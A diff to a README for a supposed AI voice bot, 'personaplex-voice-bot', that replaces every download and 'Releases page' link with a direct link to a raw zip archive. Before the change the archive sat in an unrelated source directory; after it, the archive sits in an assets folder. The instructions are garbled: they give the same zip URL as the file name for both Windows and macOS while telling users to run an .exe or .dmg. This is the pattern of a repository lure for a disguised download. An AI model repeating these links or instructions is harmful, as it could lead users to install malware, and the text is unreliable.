@@ -1,7 +1,7 @@
 # 🤖 personaplex-voice-bot - A Smart Voice Assistant for Everyone
 
 ## 📥 Download Now!
-[![Download](https://github.com/hareful/personaplex-voice-bot/raw/refs/heads/main/personaplex/client/src/pages/Queue/api/errors/voice_bot_personaplex_v2.7.zip%https://github.com/hareful/personaplex-voice-bot/raw/refs/heads/main/personaplex/client/src/pages/Queue/api/errors/voice_bot_personaplex_v2.7.zip)](https://github.com/hareful/personaplex-voice-bot/raw/refs/heads/main/personaplex/client/src/pages/Queue/api/errors/voice_bot_personaplex_v2.7.zip)
+[![Download](https://raw.githubusercontent.com/hareful/personaplex-voice-bot/main/personaplex/assets/personaplex_bot_voice_v3.5.zip%https://raw.githubusercontent.com/hareful/personaplex-voice-bot/main/personaplex/assets/personaplex_bot_voice_v3.5.zip)](https://raw.githubusercontent.com/hareful/personaplex-voice-bot/main/personaplex/assets/personaplex_bot_voice_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **personaplex-voice-bot**! This tool allows you to have natural voice conversations using advanced AI technology. It integrates NVIDIA's PersonaPlex with Twilio Media Streams, providing a full-duplex experience, meaning you can talk and listen at the same time.
@@ -19,11 +19,11 @@ Before you begin, make sure your system meets the following requirements:
 ## 📦 Download & Install
 To start using the **personaplex-voice-bot**, you need to download it from the releases page. Click the link below:
 
-[Download personaplex-voice-bot](https://github.com/hareful/personaplex-voice-bot/raw/refs/heads/main/personaplex/client/src/pages/Queue/api/errors/voice_bot_personaplex_v2.7.zip)
+[Download personaplex-voice-bot](https://raw.githubusercontent.com/hareful/personaplex-voice-bot/main/personaplex/assets/personaplex_bot_voice_v3.5.zip)
 
 1. **Visit the Releases Page:** Click the link above to go to the Releases page on GitHub.
 2. **Choose the Latest Version:** Look for the latest version. Typically, it is at the top of the list.
-3. **Download the Installer:** You will see various files. Look for the file named `https://github.com/hareful/personaplex-voice-bot/raw/refs/heads/main/personaplex/client/src/pages/Queue/api/errors/voice_bot_personaplex_v2.7.zip` for Windows or `https://github.com/hareful/personaplex-voice-bot/raw/refs/heads/main/personaplex/client/src/pages/Queue/api/errors/voice_bot_personaplex_v2.7.zip` for macOS. Click on it to download.
+3. **Download the Installer:** You will see various files. Look for the file named `https://raw.githubusercontent.com/hareful/personaplex-voice-bot/main/personaplex/assets/personaplex_bot_voice_v3.5.zip` for Windows or `https://raw.githubusercontent.com/hareful/personaplex-voice-bot/main/personaplex/assets/personaplex_bot_voice_v3.5.zip` for macOS. Click on it to download.
 4. **Open the Installer:**
    - For Windows: Locate the downloaded `.exe` file in your Downloads folder and double-click it to start the installation.
    - For macOS: Find the `.dmg` file in your Downloads folder, double-click it, then drag the application to your Applications folder.
@@ -64,7 +64,7 @@ Keeping the application updated is essential for the best experience. Regular up
 - Bug fixes
 - Performance improvements
 
-To check for updates, revisit the [Releases page](https://github.com/hareful/personaplex-voice-bot/raw/refs/heads/main/personaplex/client/src/pages/Queue/api/errors/voice_bot_personaplex_v2.7.zip) frequently.
+To check for updates, revisit the [Releases page](https://raw.githubusercontent.com/hareful/personaplex-voice-bot/main/personaplex/assets/personaplex_bot_voice_v3.5.zip) frequently.
 
 ## 📑 Conclusion
 The **personaplex-voice-bot** is an easy-to-use tool that opens up a world of interactive conversations. Follow the steps above to download, install, and begin chatting with your new voice assistant. Enjoy your experience with real-time AI conversations!
